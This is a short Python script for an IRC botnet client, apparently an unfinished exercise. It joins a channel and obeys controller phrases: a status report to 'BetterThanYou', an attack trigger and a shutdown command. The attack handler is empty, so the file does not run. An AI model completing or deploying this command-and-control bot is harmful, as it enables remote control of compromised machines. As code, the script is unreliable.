import sys, os
import socket
import select

try:
    hostname = sys.argv[1]
    port = int(sys.argv[2])
    channel = sys.argv[3]
    secretphase = sys.argv[4]
except:
    print("must state host name, port, channel, and secret phase\n\rexiting...", file=sys.stderr)
    sys.exit(-1)

# connect to irc
irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
irc.connect((hostname, port))
irc.setblocking(0)

# some initialising stuff
number = 1
nickname = "NotYourSlave"+str(number)
irc.send(bytes("USER notabot 8 * : I'm OK\r\n", "utf-8"))
irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
ready = select.select([irc], [], [], 1) # wait 1 second
if ready[0]:
    response = (irc.recv(1024)).decode("utf-8")
    print(response)
    while "Nickname is already in use" in response:
        number = number + 1
        nickname = "NotYourSlave" + str(number)
        irc.send(bytes("NICK " + nickname + "\r\n", "utf-8"))
        ready = select.select([irc], [], [], 1) # wait 1 second
        if ready[0]:
            response = (irc.recv(1024)).decode("utf-8")
        else: continue
irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))



while 1:
    ready = select.select([irc], [], [], 2) # wait 2 seconds
    if ready[0]:
        response = (irc.recv(1024)).decode("utf-8")
        print(response)
    else:
        continue

    if response.split(" ", 1)[0] == "PING":
        argument = response.split(" ", 2)[1]
        irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))

    # controller's status
    if "To me, my minions" in response:
        irc.send(bytes("PRIVMSG BetterThanYou :" + nickname +"\r\n", "utf-8"))

    # controller's attack
    if "Attack" in response:
        

    # controller's shutdown
    if "Go home, guys" in response:
        irc.send(bytes("QUIT\r\n", "utf-8"))
        sys.exit(0)
